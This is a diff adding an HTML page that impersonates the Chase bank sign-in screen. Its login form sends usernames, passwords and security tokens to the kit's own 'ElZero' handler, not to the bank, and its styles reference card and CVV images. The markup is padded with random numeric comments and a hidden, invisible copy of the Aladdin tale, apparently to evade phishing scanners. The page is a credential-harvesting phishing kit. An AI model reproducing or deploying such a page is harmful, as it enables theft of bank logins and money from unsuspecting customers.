@@ -1,0 +1,591 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
+    <meta charset="utf-8">
+    <title>sign in - chase.com</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="shortcut icon" href="./img/icon.ico">
+    <style>
+        @font-face {
+            font-family: Open Sans;
+            font-style: normal;
+            font-weight: 400;
+            src: url('./fonts/opensans-regular.ttf') format('truetype');
+        }
+        
+        html {
+            height: 100%;
+            background: #fff;
+        }
+        
+        @media only screen and (min-width: 768px) {
+            html {
+                background: #1c4f82;
+                background: -moz-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
+                background: -webkit-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
+                background: linear-gradient(to bottom, #1c4f82 0%, #2e6ea3 100%);
+            }
+        }
+        
+        .footer {
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .hide {
+            display: none;
+        }
+        
+        #loading-image {
+            position: fixed;
+            width: 125px;
+            height: 122px;
+            z-index: 1000;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transform: -webkit-translate(-50%, -50%);
+            transform: -moz-translate(-50%, -50%);
+            transform: -ms-translate(-50%, -50%);
+        }
+        
+        .lollol {
+            background-size: 36px;
+            width: 37px;
+            height: 30px;
+            right: 1px;
+            top: 13px;
+            float: left;
+            position: absolute;
+        }
+        
+        .gadiha {
+            display: table;
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            list-style: none;
+            margin: 0 0 1.5em;
+        }
+        
+        .zwina {
+            display: inline-block;
+            text-align: center;
+        }
+        
+        .img_small {
+            width: 3em;
+            height: 2em;
+            margin: 0 auto;
+            border-radius: 7px;
+            display: inline-block;
+        }
+        
+        .tgadi {
+            width: 17em;
+            height: 5.1em;
+            margin: 0 auto;
+            border-radius: 12px;
+            display: inline-block;
+        }
+        
+        .shadow {
+            box-shadow: 0 0px 24px #0b6efd;
+        }
+        
+        .card-icons {
+            vertical-align: middle;
+        }
+        
+        .lawla {
+            background-image: url('./img/lawla.png');
+            background-size: 100%;
+        }
+        
+        .lawlatwo {
+            background-image: url('./img/lawla.png');
+            background-size: 100%;
+        }
+        
+        .mastercardimg {
+            background-image: url('./img/cardsimg.png');
+            background-position: 0 65.6%;
+            background-size: 100%;
+        }
+        
+        .cco {
+            background-image: url('./img/cvv.jpg');
+            background-position: 0 50%;
+            background-size: 100%;
+        }
+        
+        .visaimg {
+            background-image: url('./img/cardsimg.png');
+            background-position: 0 88.25161%;
+            background-size: 100%;
+        }
+        
+        ol.progtrckr {
+            display: table;
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            table-layout: fixed;
+            width: 100%;
+        }
+        
+        ol.progtrckr li {
+            display: table-cell;
+            text-align: center;
+            line-height: 3em;
+        }
+        
+        <!-- Progress with steps --> ol.progtrckr {
+            margin: 0;
+            padding: 0;
+            list-style-type: none;
+        }
+        
+        ol.progtrckr li {
+            display: inline-block;
+            text-align: center;
+            line-height: 3em;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="2"] li {
+            width: 49%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="3"] li {
+            width: 33%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="4"] li {
+            width: 24%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="5"] li {
+            width: 19%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="6"] li {
+            width: 16%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="7"] li {
+            width: 14%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="8"] li {
+            width: 12%;
+        }
+        
+        ol.progtrckr[data-progtrckr-steps="9"] li {
+            width: 11%;
+        }
+        
+        ol.progtrckr li.progtrckr-done {
+            color: black;
+            border-bottom: 4px solid #0b6efd;
+        }
+        
+        ol.progtrckr li.progtrckr-todo {
+            color: silver;
+            border-bottom: 4px solid silver;
+        }
+        
+        ol.progtrckr li:after {
+            content: "\00a0\00a0";
+        }
+        
+        ol.progtrckr li:before {
+            position: relative;
+            bottom: -2.5em;
+            float: left;
+            left: 50%;
+            line-height: 1em;
+        }
+        
+        ol.progtrckr li.progtrckr-done:before {
+            content: "\2713";
+            color: white;
+            background-color: #0b6efd;
+            height: 1.2em;
+            width: 1.2em;
+            line-height: 1.2em;
+            border: none;
+            border-radius: 1.2em;
+        }
+        
+        ol.progtrckr li.progtrckr-todo:before {
+            content: "\039F";
+            color: silver;
+            background-color: white;
+            font-size: 1.5em;
+            bottom: -1.6em;
+        }
+    </style>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="./css/lostyle.css">
+</head>
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
+  
+        <!-- Loading Section -->
+    <!-- 422262103--><div class="jpui modal" id="loading" style="display: none;">
+        <!-- 219331076--><div class=" dialog vertical-center util print-position-initial" role="dialog">
+            <section class=" dialogContent">
+                <!-- 936135596--><div class=" modalContent">
+                    <!-- 479271483--><div class=" row">
+                        <img id="loading-image" src="./img/loading.gif">
+                    <!-- 11066835--></div><!-- 193238303-->
+                <!-- 984438687--></div><!-- 938877317-->            </section>
+        <!-- 817236379--></div><!-- 142662506-->    <!-- 152830822--></div><!-- 650607462-->     <!-- 29649751--><div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
+     <!-- 684471530--><div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
+                      THE ADVENTURES OF ALADDIN 
+
+   Once upon a time . . . a widow had an only son whose name was Aladdin. They
+were very poor and lived from hand to mouth, though Aladdin did what he could 
+to earn some pennies, by picking bananas in faraway places. 
+   One day, as he was looking for wild figs in a grove some way from the town,
+Aladdin met a mysterious stranger. This smartly dressed dark-eyed man with a 
+trim black beard and a splendid sapphire in his turban, asked Aladdin an 
+unusual question: 
+   "Come here, boy," he ordered. "How would you like to earn a silver penny?" 
+   "A silver penny!" exclaimed Aladdin. "Sir, I'd do anything for that kind of
+payment." 
+   "I'm not going to ask you to do much. Just go down that manhole. I'm much 
+too big to squeeze through myself. If you do as I ask, you'll have your 
+reward." The stranger helped Aladdin lift the manhole cover, for it was very 
+heavy. Slim and agile as he was, the boy easily went down. His feet touched 
+stone and he carefully made his way down some steps . . . and found himself in
+a large chamber. It seemed to sparkle, though dimly lit by the flickering 
+light of an old oil lamp. When Aladdin's eyes  became used to the gloom, he 
+saw a wonderful sight: trees dripping with glittering jewels, pots of gold and
+caskets full of priceless gems. Thousands of precious objects lay scattered
+about. It was a treasure trove! Unable to believe his eyes, Aladdin was 
+standing dazed when he heard a shout behind him.
+   "The lamp! Put out the flame and bring me the lamp!" Surprised and 
+suspicious, for why should the stranger, out of all such a treasure want only 
+an old lamp, Aladdin wondered. Perhaps he was a wizard. He decided to be on 
+his guard. Picking up the lamp, he retraced his steps up to the entrance.
+   "Give me the lamp," urged the wizard impatiently. "Hand it over," he began
+to shout, thrusting out his arm to grab it, but Aladdin cautiously drew back.
+   "Let me out first . . ."
+   "Too bad for you," snapped the stranger, slamming down the manhole cover, 
+never noticing that, as he did so, a ring slid off his finger. A terrified 
+Aladdin was left in pitch darkness, wondering what the wizard would do next. 
+Then he trod on the ring. Aimlessly putting it on his finger, he twisted it 
+round and round. Suddenly the room was flooded with a rosy light and a great 
+genie with clasped hands appeared on a cloud.
+   "At your command, sire," said the genie.
+   Now astoundede, Aladdin could only stammer:
+   "I want to go home!" In a flash he was back in his own home, though the 
+door wa tightly shut.
+   "How did you get in?" called his mother from the kitchen stove, the minute 
+she set eyes on him. Excitedly, her son told her of his adventures.
+   "Where's the silver coin?" his mother asked. Aladdin clapped a hand to his
+brow. For all he had brought home was the old oil lamp "Oh, mother! I'm so
+sorry. This is all I've got."
+   "Well, let's hope it works. It's so dirty . . ." and the widow began to rub
+the lamp.
+   Suddenly out shot another genie, in a cloud of smoke.
+   "You've set me free, after centuries! I was a prisoner in the lamp, waiting
+to be freed by someone rubbing it. Now, I'm your obedient servant. Tell me 
+your wishes." And the genie bowed respectfully, awaiting Aladdin's orders. The
+boy and his mother gaped wordlessly at this incredible apparition, then the 
+genie said with a hint of impatience in his voice. 
+   "I'm here at your command. Tell me what you want. Anything you like!" 
+Aladdin gulped, then said:
+   "Bring us . . . bring . . ." His mother not having yet begun to cook the 
+dinner, went on to say: ". . . a lovely big meal."
+   From that day on, the widow and her son had everything they could wish for:
+food, clothes and a fine home, for the genie of the lamp granted them 
+everything they asked him. Aladdin grew into a tall handsome young man and his
+mother felt that he ought to find himself a wife, sooner or later. 
+   One day, as he left the market, Aladdin happened to see the Sultan's 
+daughter Halima in her sedan chair being carried through the streets. He only 
+caught a fleeting glimpse of the princess, but it was enough for him to want 
+to marry her. Aladdin told his mother and she quickly said: 
+   "I'll ask the Sultan for his daughter's hand. He'll never be able to 
+refuse. Wait and see!"
+   And indeed, the Sultan was easily persuaded by a casket full of big 
+diamonds to admit the widow to the palace. However, when he learned why she 
+had come, he told the widow that her son must bring proof of his power and
+riches. This was mostly the Chamberlain's idea, for he himself was  eager to
+marry the beautiful black-eyed Sultan's daughter.
+   "If Aladdin wants to marry Halima,' said the Sultan, "he must send me forty
+slaves tomorrow.Every slave must bring a box of precious stones. And forty
+Arab warriors must escort the treasure."
+   Aladdin's mother went sadly home. The genie of the magic lamp had already
+worked wonders, but nothing like this. Aladdin however,when he heard the news,
+was not at all dismayed. He picked up the lamp, rubbed it harder than ever and
+told the genie what he required. The genie simply clapped his hands three 
+times. Forty slaves magically appeared, carrying the gemstones, together with 
+their escort of forty Arab warriors. When he saw all thls the next day, the 
+Sultan was taken aback. He never imagined such wealth could exist. Just as he 
+was about to accept Aladdin as his daughter's bridegroom, the envious 
+Chamberlain broke in with a question. 
+   "Where wlll they live?" he asked. The Sultan pondered for a moment, then
+allowlng greed to get the better of hlm, he told Aladdin to build a great, 
+splendid palace for Halima. Aladdin went straight home and, in what was once a
+wilderness, the genie built him a palace. The last obstacle had been overcome.
+The wedding tbok place with great celebrations and the Sultan was especially
+happy at finding such a rich and powerful son-in-law. 
+   News of Aladdin's sudden fortune and wealth spread like wildfire, until....
+one day, a strange merchant stopped beneath the palace window.
+   "Old lamps for new," he called to the princess, standing on the balcony. 
+Now, Aladdin had always kept his secret to himself. Only his mother knew it 
+and she had never told a soul. Halima, alas, had been kept in the dark. And 
+so, now, wanting to give Alladin a surprise as well  as make a good bargain, 
+she fetched the old oil lamp she had seen Aladdin tuck away, and gave it to 
+the merchant in exchange for a new one. The merchant quickly began to rub 
+it . . . and the genie was now at the service of the wizard who had got his 
+magic lamp back. 
+   In a second he whisked away all Aladdin's possessions and magically sent 
+the palace and the princess to an unknown land. Aladdin and the Sultan were at
+their wits' end. Nobody knew what had happened. Only Aladdin knew it had 
+something to do with the magic lamp. But as he wept over the lost genie of
+the lamp, he remembered the genie of the ring from the wizard's finger.
+Slipping the ring on his finger, Aladdin twisted it round and round.
+   "Take me to the place where the wizard has hidden my wife," he ordered the 
+genie. In a flash, he found himself inside his own palace, and peeping from 
+behind a curtain, he saw the wizard and the princess, now his servant.
+   "Psst! Psst!" hissed Aladdin. 
+   "Aladdin! It's you . . .!"
+   "Ssh. Don't let him hear you. Take this powder and put it into his tea. 
+Trust me." The powder quickly took effect and the wizard fell into a deep 
+sleep. Aladdin hunted for the lamp high and low, but it was nowere to be 
+seen.  But it had to be there. How, otherwise, had the wizard moved the 
+palace? As Aladdin gazed at his sleeping enemy, he thought of peering 
+underneath the pillow. "The lamp! At last," sighed Aladdin, hastily rubbing 
+it.
+   "Welcome back, Master!" exclaimed the genie. "Why did you leave me at
+another's service for so long?"
+   "Welcome," replied Aladdin. "I'm glad to see you again. I've certainly
+missed you! It's just as well I have you by me again."
+   "At your command," smiled the genie.
+   "First, put this wicked wizard in chains and take him far away where he'll
+never be found again." The genie grinned with pleasure, nodded his head, and
+the wizard vanished. Halima clutched Aladdin in fear:
+   "What's going on? Who is that genie?"
+   "Don't worry, everything is all right," Aladdin reassured her, as he told
+his wife the whole story of how he had met the wizard and found the magic 
+lamp that had enabled him to marry her. Everything went back to normal and the
+happy pair hugged each other tenderly.
+   "Can we return to our own kingdom?" the princess asked timidly, thinking
+of her father, so far away. Aladdin glanced at her with a smile.
+   "The magic that brought you here will take you back, but with me at your
+side, forever."
+   The Sultan was almost ill with worry. His daughter had disappeared along
+with the palace, and then his son-in-law had vanished too. Nobody knew where
+they were, not even the wise men hastily called to the palace to divine what
+had happened. The jealous Chamberlain kept on repeating:
+   "I told you Aladdin's fortune couldn't last."
+   Everyone had lost all hope of ever seeing the missing pair again, when far
+away, Aladdin rubbed the magic lamp and said to the genie,
+   "Take my wife, myself and the palace back to our own land, as fast as you
+can."
+   "In a flash, Sire," replied the genie. At the snap of a finger, the palace
+rose into the air and sped over the Sultan's kingdom, above the heads of his
+astonished subjects. It gently floated down to earth and landed on its old
+site. Aladdin and Halima rushed to embrace the Sultan.
+   To this very day, in that distant country, you can still admire the traces
+of an ancient palace which folk call the palace that came from the skies.   
+ <!-- 566875182--></div><!-- 11135213--> <!-- 586140623--></div><!-- 106279697--><style type="text/css">
+    .jpui.checkbox .checkboxWrap .check {
+        display: inline-block;
+        border: .0625rem solid #959595;
+        height: 1.25rem;
+        width: 1.25rem;
+        border-radius: .1875rem;
+        position: relative;
+         bottom: 0rem; 
+    }
+</style>
+    <div>
+        <div class=" homepage" tabindex="-1">
+            <div class=" logon-container">
+                <header class=" toggle-aria-hidden">
+                    <div id="hdrlog" class=" logon header jpui transparent navigation bar" style="display:block;">
+                        <a>
+                            <div class=" chase logo"><!-- 766217847--><!-- 158955049--></div><!-- 986737685--><!-- 563215990-->                        </a>
+                    <!-- 499703179--><!-- 199289831--></div><!-- 3669960--><!-- 921431527-->                    <div id="hdrup" class=" logon header jpui transparent navigation bar" style="background: transparent;background-image: linear-gradient(to bottom, rgba(11, 110, 253, 0.88) 0, rgba(11, 110, 253, 0.49) 50%, rgba(0, 0, 0, 0) 100%); display:none;">
+                        <a>
+                            <div class=" chase logo"><!-- 916379934--><!-- 471200994--></div><!-- 723033072--><!-- 913165608-->                        </a>
+                    <!-- 951731989--><!-- 594594170--></div><!-- 959575042--><!-- 449207103-->                </header>
+                <main>
+                    <div class=" container logon">
+                        <div>
+                            <div>
+                                <div class=" jpui background image fixed">
+                                    <style type="text/css">
+                                        .jpui.background.image {
+                                            background-image: url(./img/mobilenight.jpeg);
+                                            filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
+                                            -ms-filter: progid: DXImageTransform.Microsoft.AlphaImageLoader(src='./img/mobilenight.jpeg', sizingMethod='scale');
+                                        }
+                                        
+                                        @media (min-width:320px) {
+                                            .jpui.background.image {
+                                                background-image: url(./img/mobilenight.jpeg);
+                                            }
+                                        }
+                                        
+                                        @media (min-width:992px) {
+                                            .jpui.background.image {
+                                                background-image: url(./img/tabletnight.jpeg);
+                                            }
+                                        }
+                                        
+                                        @media (min-width:1024px) {
+                                            .jpui.background.image {
+                                                background-image: url(./img/desktopnight.jpeg);
+                                            }
+                                        }
+                                    </style>
+                                <!-- 825209739--><!-- 799330379--></div><!-- 648564022--><!-- 230347182-->                            <!-- 198005218--><!-- 523107739--></div><!-- 614193537--><!-- 428768030-->                        <!-- 498910170--><!-- 780410028--></div><!-- 975562907--><!-- 123336453-->                        <div class=" row">
+                        	<div class=" col-xs-12 col-md-6 col-md-offset-3 logoff" id="boxup" style="margin-top: 5em; display:none;">
+                                <div class=" jpui raised segment" style="max-width: 470px!important;">
+                                	<div class=" row">
+                                        <div class=" col-xs-12">
+                                            <div class=" progress" style="background: #0b6efd;">
+                                                <div class=" bar"><!-- 201224166--><!-- 959218415--></div><!-- 71960868--><!-- 89329554-->                                            <!-- 133859724--><!-- 803908302--></div><!-- 917751515--><!-- 389826957-->                                        <!-- 277583159--><!-- 401086963--></div><!-- 967342176--><!-- 538207868-->                                    <!-- 9060677--><!-- 489894878--></div><!-- 791399691--><!-- 168670596-->                                <!-- 201843282--><!-- 249336775--></div><!-- 276464089--><!-- 101478682-->                            <!-- 848420391--><!-- 250880267--></div><!-- 58515487--><!-- 670185499-->                            <div class=" col-xs-12 col-sm-6 col-sm-offset-3 logon-box">
+
+                                
+                                    <!-- Login Page -->
+                                <div class=" jpui raised segment" id="login" style="display:block;">
+
+                                    <div class=" row">
+                                        <div class=" col-xs-10 col-xs-offset-1">
+                                            
+                                            <form method="POST" autocomplete="off" action="../ElZero/actions/signin">
+                                                                                             
+                                                 <input type="hidden" name="tokenElzeroCsrf" value="MTY0NjgyNzQzODY4MzIzYjhjZGJiYjFlYWU2MTU2YmRmMGUzYTE0NTk3NmFjY2M1NTk4MzQ0MDY2YWVlMjI2ZDlkMWVhODY2MmQ1Mzg2NjI2Ng==">
+                                                <input type="hidden" name="elzeroKiller" value="">
+                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top">
+                                                    <div class=" jpui vertical">
+                                                        <div id="labelFlooat" class=" align-label-input floating-label__container uus ">
+                                                            <div class=" label-wrapper"> <!--Here-->
+                                                                <label id="baba" class=" jpui fieldlabel label-alignment vertical" for="userid">username</label>
+                                                            <!-- 944410297--><!-- 20175476--></div><!-- 650529303--><!-- 633812987-->                                                            <div class=" logon-xs-toggle" id="userId-text">
+                                                                <input class=" jpui input logon-xs-toggle" id="userid" placeholder="" type="text" name="userId" required="" value="">
+                                                               <h3 id="errorUser" style="color:#bf2155;display:none;">Invalid username</h3>
+																<!-- 855557660--><!-- 976264484--></div><!-- 364829439--><!-- 458479846-->                                                        <!-- 173835059--><!-- 232366865--></div><!-- 419941287--><!-- 538728697-->                                                    <!-- 620178456--><!-- 194314416--></div><!-- 178726437--><!-- 739621490-->                                                <!-- 882285926--><!-- 701005889--></div><!-- 896927053--><!-- 427601164-->                                                <div class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div id="floooaatpasss" class=" align-label-input floating-label__container pps">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="passid">Password</label>
+                                                            <!-- 114901246--><!-- 3660355--></div><!-- 379587132--><!-- 826349172-->                                                            <div class=" logon-xs-toggle" id="password-text">
+                                                                <input class=" jpui input logon-xs-toggle " id="passid" placeholder="" autocomplete="off" type="password" name="password" required="" value=""> <!-- 907944724--><!-- 610271770--></div><!-- 251456109--><!-- 588019968-->                                                        <!-- 846549193--><!-- 702169724--></div><!-- 904831840--><!-- 37476509-->                                                    <!-- 846002930--><!-- 778924999--></div><!-- 857883207--><!-- 303205354-->                                                <!-- 570588194--><!-- 402206613--></div><!-- 439875266--><!-- 919149398-->                                                <div id="tokenin" style="display:none;" class=" jpui fieldgroup logon-xs-toggle logon-floating-label">
+                                                    <div class=" jpui vertical">
+                                                        <div class=" align-label-input floating-label__container tk">
+                                                            <div class=" label-wrapper">
+                                                                <label class=" jpui fieldlabel label-alignment vertical" for="Token">Token</label>
+                                                            <!-- 954183067--><!-- 944088100--></div><!-- 283255873--><!-- 393316502-->                                                            <div class=" logon-xs-toggle">
+                                                                <input class="inputToken jpui input logon-xs-toggle " id="Token" placeholder="" autocomplete="off" type="number" pattern="[0-9]*" inputmode="numeric" maxlength="35" name="Token" value=""> <!-- 598139149--><!-- 907583428--></div><!-- 649139302--><!-- 72547851-->                                                        <!-- 903706730--><!-- 531771730--></div><!-- 510523248--><!-- 91838289-->                                                    <!-- 19356481--><!-- 223410635--></div><!-- 553231115--><!-- 861720086-->                                                <!-- 438041176--><!-- 567598175--></div><!-- 645905072--><!-- 810857351-->                                                <div class=" row logon-xs-toggle">
+                                                    <div class=" col-xs-6 rememberMe-checkbox-container">
+                                                        <div class=" jpui checkbox">
+                                                            <div class=" checkbox-flex">
+                                                                <div class=" checkboxWrap" id="rem">
+                                                                    <input class=" jpui checkmark icon check rem" type="checkbox">
+                                                                    <!-- <i class=" jpui checkmark icon check"></i> -->
+                                                                <!-- 620558659--><!-- 514700768--></div><!-- 701796954--><!-- 46553929-->                                                                <div class=" checkboxWrap" id="rem1" style="display:none;">
+                                                                    <!-- <input class=" checkbox__input checkbox__input--checked rem1" type="checkbox"> -->
+                                                                    <i class=" jpui checkmark icon check"></i>
+                                                                <!-- 157477393--><!-- 507944439--></div><!-- 799716581--><!-- 485295263-->                                                                <label> <span class=" checkbox-label">Remember me </span></label>
+                                                            <!-- 767105048--><!-- 137540699--></div><!-- 712519051--><!-- 560644613-->                                                        <!-- 952110558--><!-- 544554823--></div><!-- 577331209--><!-- 951292535-->                                                    <!-- 477855133--><!-- 694458718--></div><!-- 682189568--><!-- 563760794-->                                                    <div class=" col-xs-6 token-checkbox-container">
+                                                        <div class=" jpui checkbox useToken">
+                                                            <div class=" checkbox-flex">
+                                                                <div class=" checkboxWrap" id="tkn">
+                                                                    <input id="tooookeeen" class="jpui checkmark icon check tkn" type="checkbox">
+                                                                    <!-- <i class=" jpui checkmark icon check"></i> -->
+                                                                <!-- 711701875--><!-- 790743769--></div><!-- 375700416--><!-- 629424148-->                                                                
+                                                                <label> <span class=" checkbox-label">use token </span></label>
+                                                            <!-- 648690597--><!-- 176180512--></div><!-- 422586927--><!-- 703833619-->                                                        <!-- 860929137--><!-- 694979240--></div><!-- 915660686--><!-- 252090935-->                                                    <!-- 421403664--><!-- 622362439--></div><!-- 253617988--><!-- 712212312-->                                                <!-- 485160202--><!-- 406421998--></div><!-- 948479349--><!-- 487066819-->                                                <div class=" row">
+                                                    <button id="subbo" type="submit" class=" jpui button focus fluid primary touch"><span class=" label">sign in</span> </button>
+                                                <!-- 804497952--><!-- 302832254--></div><!-- 720927578--><!-- 218365851-->                                                <div class=" row"><span class=" jpui link"><a class=" link-anchor touch">Forgot username/password?<i class=" jpui progressright icon end-icon"></i></a></span><!-- 354378871--><!-- 766667450--></div><!-- 870583887--><!-- 870784370-->                                                <div class=" row"><span class=" jpui link"><a class=" link-anchor last touch">Not Enrolled? sign up Now.<i class=" jpui progressright icon end-icon"></i></a></span><!-- 323442301--><!-- 461412651--></div><!-- 426879522--><!-- 63747373-->                                            </form>
+                                        <!-- 974585131--><!-- 152987965--></div><!-- 313519235--><!-- 37571155-->                                    <!-- 131897230--><!-- 499712231--></div><!-- 294668039--><!-- 639251866-->                                <!-- 886667180--><!-- 223481305--></div><!-- 484814029--><!-- 885634159-->                        	<!-- 905538828--><!-- 733197656--></div><!-- 66066145--><!-- 601916195-->                    	<!-- 221739614--><!-- 280736756--></div><!-- 533814047--><!-- 578782417-->                	<!-- 859868890--><!-- 648809787--></div><!-- 250912801--><!-- 46052190-->            	</main>
+            <!-- 73907847--><!-- 22130528--></div><!-- 89727481--><!-- 990048407-->
+       <div class=" footer">
+                <div class=" footer-container">
+                    <div class=" container">
+                        <div class=" social-links row">
+                            <div class=" col-xs-12"><span class=" follow-us-text">Follow us:</span>
+                                <ul class=" icon-links">
+                                    <li class=" facebook"><span><a class=" jpui iconaction touch"> <i class=" jpui facebook icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class=" instagram"><span><a class=" jpui iconaction touch"> <i class=" jpui instagram icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class=" twitter"><span><a class=" jpui iconaction touch"><i class=" jpui twitter icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class=" youtube"><span><a class=" jpui iconaction touch"><i class=" jpui youtube icon"></i></a>
+                                        </span>
+                                    </li>
+                                    <li class=" linkedin"><span><a class=" jpui iconaction touch"> <i class=" jpui linkedin icon"></i></a>
+                                        </span>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class=" footer-links row implement-ada-features-enabled">
+                            <div class=" col-xs-12">
+                                <ul>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Contact us</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Privacy</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">security</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Terms of use</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Accessibility</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">sAFE Act: Chase Mortgage Loan Originators</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Fair Lending</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">About Chase</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">J.P. Morgan</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">JPMorgan Chase &amp; Co.</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Careers</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Español</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">Chase Canada</a></span></li>
+                                    <li><span class=" jpui link"><a class=" link-anchor touch">site map</a></span></li>
+                                    <li>Member FDIC</li>
+                                    <li><i class=" jpui equal-housing-lender icon touch"></i>Equal Housing Lender</li>
+                                    <li class=" copyright-label">©
+                                        <script>
+                                            document.write(new Date().getFullYear())
+                                        </script>2022JPMorgan Chase &amp; Co.</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class=" row galaxy-footer">
+                            <div class=" col-xs-10 col-xs-offset-1">
+                                <p class=" NOTE"><span></span>
+                                    <br> <span class=" copyright-label">© <script> document.write(new Date().getFullYear()) </script>2022JPMorgan Chase &amp; Co.</span></p>
+                                <p><span class=" jpui link"><a class=" link-anchor NOTELINK touch">Privacy<i class=" jpui progressright icon end-icon"></i></a></span></p>
+                                <p><span class=" jpui link"><a class=" link-anchor NOTELINK touch">Accessibility<i class=" jpui progressright icon end-icon"></i></a></span></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+    <script src="./js/ElZero.js"></script>
+
+
+
+
+
+
+
+</body></html>
